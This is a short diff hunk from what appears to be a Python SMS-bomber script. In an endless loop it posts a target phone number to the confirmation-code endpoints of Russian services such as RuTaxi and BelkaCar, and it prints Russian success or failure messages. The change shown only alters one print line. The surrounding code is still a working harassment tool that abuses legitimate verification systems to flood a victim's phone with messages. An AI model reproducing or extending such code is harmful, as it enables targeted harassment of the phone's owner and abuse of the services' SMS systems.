@@ -51,7 +51,7 @@ while True:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 		print(colored("[+] RuTaxi отправлено!)", 'lawngreen')
 	except:
-		print(colored("[-] Не отправлено!", 'red')
+		print("[-] Не отправлено!")
 
 	try:
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
